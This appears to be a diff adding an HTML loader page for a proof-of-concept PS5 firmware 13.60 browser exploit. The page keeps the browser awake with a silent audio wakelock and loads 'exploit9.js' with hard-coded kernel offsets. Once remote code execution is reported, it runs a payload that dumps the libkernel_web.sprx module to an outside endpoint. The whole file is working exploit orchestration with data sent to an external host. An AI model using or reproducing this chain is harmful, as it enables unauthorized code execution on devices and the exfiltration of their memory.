@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>ds</title>
+<style>
+body{background:#101418;color:#cfe;margin:0;padding:8px;font:12px/1.5 monospace}
+#cap{font-weight:700;font-size:14px}
+#cat.ok #status{color:#7f7}#cat.bad #status{color:#f77}#cat.run #status{color:#fc7}
+#scr{white-space:pre-wrap;max-height:45vh;overflow:hidden;color:#9bc}
+#dumpStatus{color:#fc7;font-weight:700}
+</style>
+</head>
+<body>
+<div id="cap">PoC PS5 FW 13.60 (lite10: foreground-quiet + wakelock) — leave this screen open, don't press anything</div>
+<div id="cat"><span id="status">boot</span></div>
+<pre id="scr"></pre>
+<div id="dumpStatus">waiting…</div>
+<script>
+"use strict";
+// lite10 = lite8's total silence + two first-principles fixes:
+//  1. exploit9.js: success path does NOT free ~100MB before initKernel
+//     (that free armed a GC pass between ROP arming and first use -> segfault).
+//     Transient refs are released by the payload after the dump.
+//  2. auto=1&max=5: failed attempts retry IN-PAGE (no reload, no crash loop).
+// Still zero fetches from load until the payload's own ping.
+const BUILD_ID = "local-lite10";
+const ENDPOINT = "https://adityas-macbook-pro.tailddb851.ts.net/__deepslop/dump";
+const PARAMS = "go=1&fw=13.60&scan=0&auto=1&max=5&build=" + BUILD_ID
+  + "&hc=0x56a58,0x56ca0,0x57ce8&gd=0x1d6fa&nt=0x48b0"
+  + "&gps=0x334e238&gpe=0x1b860&cls=0x334e228&cle=0x274e0&ers=0x334e230&ere=0xf7d0";
+
+const scr = document.getElementById("scr");
+const lines = [];
+// Audio WakeLock: keeps the PS5 browser tab from throttling/sleeping while
+// it sits foreground untouched (proven pattern from the full site).
+try {
+  const AC = window.AudioContext || window.webkitAudioContext;
+  if (AC) {
+    const actx = new AC();
+    if (actx.state === "suspended") actx.resume();
+    const osc = actx.createOscillator();
+    const gain = actx.createGain();
+    gain.gain.value = 0.0001;
+    osc.frequency.value = 1;
+    osc.connect(gain);
+    gain.connect(actx.destination);
+    osc.start();
+  }
+} catch (e) { }
+window.__LITE_QUIET_PAYLOAD = true;
+window.addLog = function (t) {
+  lines.push(String(t).slice(0, 200));
+  if (lines.length > 24) lines.splice(0, lines.length - 24);
+  scr.textContent = lines.join("\n");
+};
+window.setRuntimeStage = function () { };
+window.setRuntimeState = function (t) { document.getElementById("status").textContent = t; };
+window.setDumpProgress = function () { };
+window.payOut = function (t) { window.__PAY_BUFFER = (window.__PAY_BUFFER || "") + t + "\n"; };
+window.addExploitStatus = function (t, cls) { window.setRuntimeState(t); };
+window.setDumpRowStatus = function () { };
+
+let booted = false;
+function boot() {
+  if (booted) return;
+  booted = true;
+  const runToken = "lite10-" + Date.now().toString(36);
+  window.__DEEPSLOP_ACTIVE_RUN = runToken;
+  window.EXPLOIT_PARAMS = new URLSearchParams(PARAMS + "&run=" + runToken);
+  addLog("[LITE9] loading kernel-stubs…");
+  const s = document.createElement("script");
+  s.src = "full/kernel-stubs.js?_=" + Date.now();
+  s.onload = function () {
+    addLog("[LITE9] loading exploit9 (gc-quiet, auto-retry)…");
+    const e = document.createElement("script");
+    e.src = "full/exploit9.js?" + PARAMS + "&run=" + runToken + "&_=" + Date.now();
+    e.onload = function () { addLog("[LITE9] exploit loaded"); };
+    e.onerror = function () { addLog("[ERR] exploit failed to load"); };
+    document.head.appendChild(e);
+  };
+  s.onerror = function () { addLog("[ERR] kernel-stubs failed to load"); };
+  document.head.appendChild(s);
+}
+
+let dumpStarted = false;
+(function waitForRce() {
+  if (dumpStarted) return;
+  if (window.notifyReady === true && typeof window.aimRead === "function"
+      && window.deepslopModuleRegistry) {
+    dumpStarted = true;
+    // still zero fetches — the payload's ping is the first beacon
+    document.getElementById("dumpStatus").textContent = "RCE ACTIVE — payload running (fully silent)";
+    window.__DEEPSLOP_DUMP_REQUEST = {
+      module: "libkernel_web.sprx",
+      speed: "low",
+      mode: "dump",
+      endpoint: ENDPOINT,
+    };
+    setTimeout(function () {
+      const p = document.createElement("script");
+      p.src = "payloads/sprx_dump_lite.js?_=" + Date.now();
+      p.onload = function () { if (p.parentNode) p.parentNode.removeChild(p); };
+      document.body.appendChild(p);
+    }, 1500);
+    return;
+  }
+  setTimeout(waitForRce, 700);
+})();
+
+boot();
+</script>
+</body>
+</html>
